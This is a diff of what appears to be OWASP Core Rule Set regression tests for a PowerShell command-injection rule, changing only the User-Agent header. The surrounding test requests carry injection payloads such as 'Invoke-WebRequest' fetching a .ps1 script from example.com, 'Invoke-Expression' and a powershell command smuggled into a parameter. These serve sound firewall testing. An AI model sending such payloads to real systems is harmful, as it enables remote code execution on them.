@@ -13,7 +13,7 @@ tests:
             method: "GET"
             port: 80
             headers:
-              User-Agent: OWASP ModSecurity Core Rule Set
+              User-Agent: "OWASP CRS test agent"
               Host: "localhost"
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             uri: "/get?932120-1=Invoke-WebRequest%20http://example.com/path/file.ps1"
@@ -29,7 +29,7 @@ tests:
             port: 80
             uri: '/post'
             headers:
-              User-Agent: OWASP ModSecurity Core Rule Set
+              User-Agent: "OWASP CRS test agent"
               Host: "localhost"
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             data: '932120-2=Invoke-WebRequest http://example.com/path/file.ps1'
@@ -44,7 +44,7 @@ tests:
             method: "GET"
             port: 80
             headers:
-              User-Agent: OWASP ModSecurity Core Rule Set
+              User-Agent: "OWASP CRS test agent"
               Host: "localhost"
               Cookie: "931120-3=Invoke-Expression%20-Command%20file.ps1"
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
@@ -61,7 +61,7 @@ tests:
             port: 80
             uri: "/post"
             headers:
-              User-Agent: OWASP ModSecurity Core Rule Set
+              User-Agent: "OWASP CRS test agent"
               Host: "localhost"
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             data: '932120-4=Invoke Web Request http://example.com/path/file.ps1'
@@ -78,7 +78,7 @@ tests:
             port: 80
             uri: "/post"
             headers:
-              User-Agent: OWASP ModSecurity Core Rule Set
+              User-Agent: "OWASP CRS test agent"
               Host: "localhost"
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             data: 'cmd=powershell%20C%3A%5Cwindows%5Csystem32%5Cnotepad.exe'
